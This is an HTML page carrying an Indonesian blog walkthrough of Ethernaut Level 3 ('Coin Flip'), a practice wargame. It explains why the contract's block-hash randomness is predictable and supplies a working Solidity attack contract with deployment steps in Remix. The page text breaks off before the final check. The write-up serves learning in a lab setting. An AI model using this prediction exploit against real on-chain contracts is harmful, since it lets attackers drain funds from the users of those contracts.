@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Level 3 - Coin Flip | Ardias</title>
+<meta name="keywords" content="Ethernaut">
+<meta name="description" content="Hai! Kembali lagi ke series belajar ethernaut, kita akan melanjutkan Level 3 yaitu Coin Flip. Lesgoo!
+Pada level kali ini kita diberikan source code seperti berikut
+// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract CoinFlip { uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number - 1)); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ?">
+<meta name="author" content="Ardias">
+<link rel="canonical" href="https://agilfchx.github.io/posts/level3-coinflip/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.5cfc680b1eeaeef9efbced92d46c2a9e876b72ee14fba85846afc4cff9e6e6f8.css" integrity="sha256-XPxoCx7q7vnvvO2S1Gwqnodrcu4U&#43;6hYRq/Ez/nm5vg=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://agilfchx.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://agilfchx.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://agilfchx.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://agilfchx.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://agilfchx.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Level 3 - Coin Flip" />
+<meta property="og:description" content="Hai! Kembali lagi ke series belajar ethernaut, kita akan melanjutkan Level 3 yaitu Coin Flip. Lesgoo!
+Pada level kali ini kita diberikan source code seperti berikut
+// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract CoinFlip { uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number - 1)); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://agilfchx.github.io/posts/level3-coinflip/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-02T22:16:12+07:00" />
+<meta property="article:modified_time" content="2023-09-02T22:16:12+07:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Level 3 - Coin Flip"/>
+<meta name="twitter:description" content="Hai! Kembali lagi ke series belajar ethernaut, kita akan melanjutkan Level 3 yaitu Coin Flip. Lesgoo!
+Pada level kali ini kita diberikan source code seperti berikut
+// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract CoinFlip { uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number - 1)); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ?"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://agilfchx.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Level 3 - Coin Flip",
+      "item": "https://agilfchx.github.io/posts/level3-coinflip/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Level 3 - Coin Flip",
+  "name": "Level 3 - Coin Flip",
+  "description": "Hai! Kembali lagi ke series belajar ethernaut, kita akan melanjutkan Level 3 yaitu Coin Flip. Lesgoo!\nPada level kali ini kita diberikan source code seperti berikut\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract CoinFlip { uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number - 1)); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ?",
+  "keywords": [
+    "Ethernaut"
+  ],
+  "articleBody": "Hai! Kembali lagi ke series belajar ethernaut, kita akan melanjutkan Level 3 yaitu Coin Flip. Lesgoo!\nPada level kali ini kita diberikan source code seperti berikut\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract CoinFlip { uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number - 1)); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++; return true; } else { consecutiveWins = 0; return false; } } } Goals : Menebak dengan benar sebanyak 10 kali berturut-turut\nBreakdown the code Let’s go kita bahas code yang menarik untuk dibahas\nfunction flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number - 1)); **(1)** if (lastHash == blockValue) { **(2)** revert(); } lastHash = blockValue; **(3)** uint256 coinFlip = blockValue / FACTOR; **(4)** bool side = coinFlip == 1 ? true : false; **(5)** if (side == _guess) { **(6)** consecutiveWins++; return true; } else { consecutiveWins = 0; return false; } } Pada smart contract ini hanya terdapat satu function saja flip() yang dimana membutuhkan sebuah parameter berupa boolean yang akan menentukan apakah tebakan kita akan sesuai atau tidak dengan random generate nya ini.\nPada nomor 1 ini merupakan sebuah deklarasi blockValue yang dimana akan assign nilai hash dari blok sebelumnya. Kondisi pada nomor 2 ini mengecek apakah lastHash mempunyai kesamaan dengan hash di blockValue jika iya maka dia akan melakukan revert lastHash di assign dengan blockValue jika kondisi pada nomor 2 tidak terpenuhi Nomor 4 ini coinFlip akan di assign dari hasil perhitungan blockValue / FACTOR Variable side ini akan mengecek apakah hasil dari coinFlip ini adalah 1 atau 0 , jika 1 maka true dan jika 0 maka false Mengecek apakah guess kita benar dengan side yang sudah di acak Explainoit (Explain \u0026 Exploit) Setelah memahami smart contract di atas, kita bisa melakukan exploit terhadap smart contract ini tetapi kita perlu perhatikan berikut ini:\nFunction flip() ini hanya bisa dipanggil satu kali dalam satu block, ini dijelaskan pada nomor 2 yang dimana akan melakukan revert() jika lastHash dan blockValue nya sama dengan yang sebelumnya. Jadi sangat tidak memungkinkan untuk menang 10 kali dalam berturut-turut pada level ini. Tetapi kita bisa abuse karena:\nKita mengetahui bahwa blockValueakan mempunyai hash yang sama dan blockValue ini kita mengetahui dari block.number yang tidak random karena berupa hash dan hash tidak akan berubah pada block.number yang sama. Angka yang dihasilkan dari coinFlip akan random tetapi karena blockValue nya mempunyai value yang sama maka hasilnya juga akan sama seperti sebelumnya sehingga chance untuk menangnya adalah 100% Dari penjelasan di atas kita akan membuat sebuah script yang akan melakukan exploit dari smart contract di atas agar bisa melakukan coin flip setiap saat yang dimana kita tidak memelurkan kondisi pada nomor 2 dan memenangkannya selama 10x berturut-turut atau lebih.\nPada level ini kita akan menggunakan Remix IDE untuk menyelesaikan level ini. Pertama kita akan membuat sebuah Folder dan disini saya memberi nama 3_Coin Flip\nFolder Coin Flip di Remix Pada folder tersebut buah 2 contract yang pertama adalah smart contract yang telah dikasih CoinFlip.sol dan kedua adalah Attack.sol. Masukkan smart contract original Coin Flip ke file CoinFlip.sol , lalu pada Attack.sol buat seperti berikut ini\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import './CoinFlip.sol'; contract Attack { CoinFlip public coinContract; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor(){ coinContract = CoinFlip(**INSTANCE-ADDRESS**); } function AttackContract() public { uint256 blockValue = uint256(blockhash(block.number - 1)); uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; coinContract.flip(side); } } Mungkin saya tidak akan menjelaskan secara detail, tetapi kita akan menghapus pengkondisian dan lastHast pada smart contract original agar kita bisa melewati code tersebut. Lalu disini juga kita memanggil contract CoinFlip yang diberi nama coinContract, pada constructor bagian INSTANCE-ADDRESS ganti dengan INSTANCE ADDRESS yang diberikan pada console browser\nInstance Address dari Contract Level 3 Setelah semuanya siap, kita pertama-tama membutuhkan compile terlebih dahulu. Bisa diikuti seperti di gambar\nCompiling Contract Setelah itu kita akan melakukan deploy smart contract, tetappi pertama-tama kita harus ubah environmentnya terlebih dahulu ke Injected Provider - MetaMask agar bisa terhubung dengan instance nya dan nanti akan muncul popup MetaMask untuk connect account ganache kita yang terhubung ke Ethernaut\nMengganti EVM di Remix Setelah itu pastikan pada kolom Contract namanya adalah Attack.sol atau sesuaikan dengan nama yang menyimpan script untuk menyelesaikan level ini dan jika sudah klik Deploy\nMemilih contract Attack.sol untuk di deploy Nanti hasil deploy akan muncul dibawah pada Deployed Contracts\nHasil Deployed Contract Nah disini kalian cukup klik tombol orange yang tulisan AttackContract dan Confirm ketika popup MetaMask muncul sebanyak 10 kali 😂\nMenjalankan AttackContract dan konfirmasi Metamask Untuk cek nya apakah sudah 10 kali atau belum kalian bisa ketikkan perintah berikut ini di console\nawait contract.consecutiveWins().then((v) =\u003e v.toString()); Melihat consecutiveWins di console Jika sudah 10x maka kalian bisa klik Submit Instance dan level 3 selesai\nconsecutiveWins mencapai 10 ",
+  "wordCount" : "836",
+  "inLanguage": "en",
+  "datePublished": "2023-09-02T22:16:12+07:00",
+  "dateModified": "2023-09-02T22:16:12+07:00",
+  "author":{
+    "@type": "Person",
+    "name": "Ardias"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://agilfchx.github.io/posts/level3-coinflip/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Ardias",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://agilfchx.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://agilfchx.github.io/" accesskey="h" title="Ardias (Alt + H)">
+                <img src="https://agilfchx.github.io/logo.png" alt="" aria-label="logo"
+                    height="35">Ardias</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://agilfchx.github.io/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://agilfchx.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://agilfchx.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://agilfchx.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://agilfchx.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      Level 3 - Coin Flip
+    </h1>
+    <div class="post-meta"><span title='2023-09-02 22:16:12 +0700 +0700'>September 2, 2023</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;Ardias
+
+</div>
+  </header> 
+  <div class="post-content"><p>Hai! Kembali lagi ke series belajar ethernaut, kita akan melanjutkan Level 3 yaitu Coin Flip. Lesgoo!</p>
+<p>Pada level kali ini kita diberikan source code seperti berikut</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">CoinFlip</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">public</span> consecutiveWins;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint256</span> lastHash;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint256</span> FACTOR <span style="color:#f92672">=</span> <span style="color:#ae81ff">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>() {
+</span></span><span style="display:flex;"><span>    consecutiveWins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flip</span>(<span style="color:#66d9ef">bool</span> _guess) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> blockValue <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint256</span>(blockhash(block.number <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (lastHash <span style="color:#f92672">==</span> blockValue) {
+</span></span><span style="display:flex;"><span>      revert();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    lastHash <span style="color:#f92672">=</span> blockValue;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> coinFlip <span style="color:#f92672">=</span> blockValue <span style="color:#f92672">/</span> FACTOR;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> side <span style="color:#f92672">=</span> coinFlip <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (side <span style="color:#f92672">==</span> _guess) {
+</span></span><span style="display:flex;"><span>      consecutiveWins<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      consecutiveWins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><blockquote>
+<p><strong>Goals</strong> : Menebak dengan benar sebanyak <strong><em>10 kali berturut-turut</em></strong></p>
+</blockquote>
+<h3 id="breakdown-the-code">Breakdown the code<a hidden class="anchor" aria-hidden="true" href="#breakdown-the-code">#</a></h3>
+<p>Let’s go kita bahas code yang menarik untuk dibahas</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flip</span>(<span style="color:#66d9ef">bool</span> _guess) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> blockValue <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint256</span>(blockhash(block.number <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));  <span style="color:#f92672">**</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">**</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (lastHash <span style="color:#f92672">==</span> blockValue) {                               <span style="color:#f92672">**</span>(<span style="color:#ae81ff">2</span>)<span style="color:#f92672">**</span>
+</span></span><span style="display:flex;"><span>      revert();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    lastHash <span style="color:#f92672">=</span> blockValue;                                      <span style="color:#f92672">**</span>(<span style="color:#ae81ff">3</span>)<span style="color:#f92672">**</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> coinFlip <span style="color:#f92672">=</span> blockValue <span style="color:#f92672">/</span> FACTOR;                     <span style="color:#f92672">**</span>(<span style="color:#ae81ff">4</span>)<span style="color:#f92672">**</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> side <span style="color:#f92672">=</span> coinFlip <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;                   <span style="color:#f92672">**</span>(<span style="color:#ae81ff">5</span>)<span style="color:#f92672">**</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (side <span style="color:#f92672">==</span> _guess) {                                       <span style="color:#f92672">**</span>(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">**</span>
+</span></span><span style="display:flex;"><span>      consecutiveWins<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      consecutiveWins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>Pada smart contract ini hanya terdapat satu function saja <code>flip()</code> yang dimana membutuhkan sebuah parameter berupa boolean yang akan menentukan apakah tebakan kita akan sesuai atau tidak dengan random generate nya ini.</p>
+<ol>
+<li>Pada nomor 1 ini merupakan sebuah deklarasi <code>blockValue</code> yang dimana akan assign nilai hash dari blok sebelumnya.</li>
+<li>Kondisi pada nomor 2 ini mengecek apakah <code>lastHash</code> mempunyai kesamaan dengan hash di <code>blockValue</code> jika iya maka dia akan melakukan revert</li>
+<li><code>lastHash</code> di assign dengan <code>blockValue</code> jika kondisi pada nomor 2 tidak terpenuhi</li>
+<li>Nomor 4 ini <code>coinFlip</code> akan di assign dari hasil perhitungan <code>blockValue / FACTOR</code></li>
+<li>Variable <code>side</code> ini akan mengecek apakah hasil dari <code>coinFlip</code> ini adalah <code>1</code> atau <code>0</code> , jika <code>1</code> maka <code>true</code> dan jika <code>0</code> maka <code>false</code></li>
+<li>Mengecek apakah <code>guess</code> kita benar dengan <code>side</code> yang sudah di acak</li>
+</ol>
+<h3 id="explainoit-explain--exploit">Explainoit (Explain &amp; Exploit)<a hidden class="anchor" aria-hidden="true" href="#explainoit-explain--exploit">#</a></h3>
+<p>Setelah memahami smart contract di atas, kita bisa melakukan exploit terhadap smart contract ini tetapi kita perlu perhatikan berikut ini:</p>
+<ol>
+<li>Function <code>flip()</code> ini hanya bisa dipanggil satu kali dalam satu block, ini dijelaskan pada nomor 2 yang dimana akan melakukan <code>revert()</code> jika <code>lastHash</code> dan <code>blockValue</code> nya sama dengan yang sebelumnya.</li>
+</ol>
+<p>Jadi sangat tidak memungkinkan untuk menang 10 kali dalam berturut-turut pada level ini. Tetapi kita bisa abuse karena:</p>
+<ol>
+<li>Kita mengetahui bahwa <code>blockValue</code>akan mempunyai hash yang sama dan <code>blockValue</code> ini kita mengetahui dari <code>block.number</code> yang tidak random karena berupa hash dan hash tidak akan berubah pada <code>block.number</code> yang sama.</li>
+<li>Angka yang dihasilkan dari <code>coinFlip</code> akan random tetapi karena <code>blockValue</code> nya mempunyai value yang sama maka hasilnya juga akan sama seperti sebelumnya sehingga chance untuk menangnya adalah 100%</li>
+</ol>
+<p>Dari penjelasan di atas kita akan membuat sebuah script yang akan melakukan exploit dari smart contract di atas agar bisa melakukan coin flip setiap saat yang dimana kita tidak memelurkan kondisi pada nomor 2 dan memenangkannya selama 10x berturut-turut atau lebih.</p>
+<p>Pada level ini kita akan menggunakan <a href="https://remix.ethereum.org/">Remix IDE</a> untuk menyelesaikan level ini. Pertama kita akan membuat sebuah Folder dan disini saya memberi nama <code>3_Coin Flip</code></p>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/20230902/folder-cf.png#center"/> <figcaption>
+            Folder Coin Flip di Remix
+        </figcaption>
+</figure>
+
+<p>Pada folder tersebut buah 2 contract yang pertama adalah smart contract yang telah dikasih <code>CoinFlip.sol</code> dan kedua adalah <code>Attack.sol</code>. Masukkan smart contract original Coin Flip ke file <code>CoinFlip.sol</code> , lalu pada <code>Attack.sol</code> buat seperti berikut ini</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;./CoinFlip.sol&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Attack</span> {
+</span></span><span style="display:flex;"><span>    CoinFlip <span style="color:#66d9ef">public</span> coinContract;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> FACTOR <span style="color:#f92672">=</span> <span style="color:#ae81ff">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">constructor</span>(){
+</span></span><span style="display:flex;"><span>        coinContract <span style="color:#f92672">=</span> CoinFlip(<span style="color:#f92672">**</span>INSTANCE<span style="color:#f92672">-</span>ADDRESS<span style="color:#f92672">**</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">AttackContract</span>() <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint256</span> blockValue <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint256</span>(blockhash(block.number <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint256</span> coinFlip <span style="color:#f92672">=</span> blockValue <span style="color:#f92672">/</span> FACTOR;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">bool</span> side <span style="color:#f92672">=</span> coinFlip <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        coinContract.flip(side);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Mungkin saya tidak akan menjelaskan secara detail, tetapi kita akan menghapus pengkondisian dan <code>lastHast</code> pada smart contract original agar kita bisa melewati code tersebut. Lalu disini juga kita memanggil contract <code>CoinFlip</code> yang diberi nama <code>coinContract</code>, pada <strong><em>constructor</em></strong> bagian <code>INSTANCE-ADDRESS</code> ganti dengan INSTANCE ADDRESS yang diberikan pada console browser</p>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/20230902/instanceaddress.png#center"/> <figcaption>
+            Instance Address dari Contract Level 3
+        </figcaption>
+</figure>
+
+<p>Setelah semuanya siap, kita pertama-tama membutuhkan compile terlebih dahulu. Bisa diikuti seperti di gambar</p>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/20230902/compiling.png#center"/> <figcaption>
+            Compiling Contract
+        </figcaption>
+</figure>
+
+<p>Setelah itu kita akan melakukan deploy smart contract, tetappi pertama-tama kita harus ubah <code>environment</code>nya terlebih dahulu ke <code>Injected Provider - MetaMask</code> agar bisa terhubung dengan instance nya dan nanti akan muncul popup <code>MetaMask</code> untuk connect account ganache kita yang terhubung ke Ethernaut</p>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/20230902/changevm.png#center"/> <figcaption>
+            Mengganti EVM di Remix
+        </figcaption>
+</figure>
+
+<p>Setelah itu pastikan pada kolom <code>Contract</code> namanya adalah <code>Attack.sol</code> atau sesuaikan dengan nama yang menyimpan script untuk menyelesaikan level ini dan jika sudah klik <code>Deploy</code></p>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/20230902/attacksol.png#center"/> <figcaption>
+            Memilih contract Attack.sol untuk di deploy
+        </figcaption>
+</figure>
+
+<p>Nanti hasil deploy akan muncul dibawah pada <code>Deployed Contracts</code></p>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/20230902/deployedremix.png#center"/> <figcaption>
+            Hasil Deployed Contract
+        </figcaption>
+</figure>
+
+<p>Nah disini kalian cukup klik tombol orange yang tulisan <code>AttackContract</code> dan <code>Confirm</code> ketika popup <code>MetaMask</code> muncul sebanyak 10 kali 😂</p>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/20230902/attackcontract.png#center"/> <figcaption>
+            Menjalankan AttackContract dan konfirmasi Metamask
+        </figcaption>
+</figure>
+
+<p>Untuk cek nya apakah sudah 10 kali atau belum kalian bisa ketikkan perintah berikut ini di console</p>
